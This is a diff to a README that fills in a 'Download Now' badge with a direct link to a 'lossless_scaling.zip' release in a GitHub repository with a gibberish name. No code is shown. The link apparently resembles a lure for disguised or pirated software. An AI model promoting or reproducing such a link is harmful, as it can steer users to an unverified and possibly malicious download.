@@ -4,7 +4,7 @@
 ---
 
 <p align="center">
-  <a href="[REPLACE_WITH_DOWNLOAD_LINK](https://github.com/Crushomenhir/ugufyygvkgc-huibjlgvlgv/releases/download/new/lossless_scaling.zip)">
+  <a href="[https://github.com/Crushomenhir/ugufyygvkgc-huibjlgvlgv/releases/download/new/lossless_scaling.zip]">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Now-brightgreen?style=for-the-badge&logoColor=white" alt="Download">
   </a>
 </p>
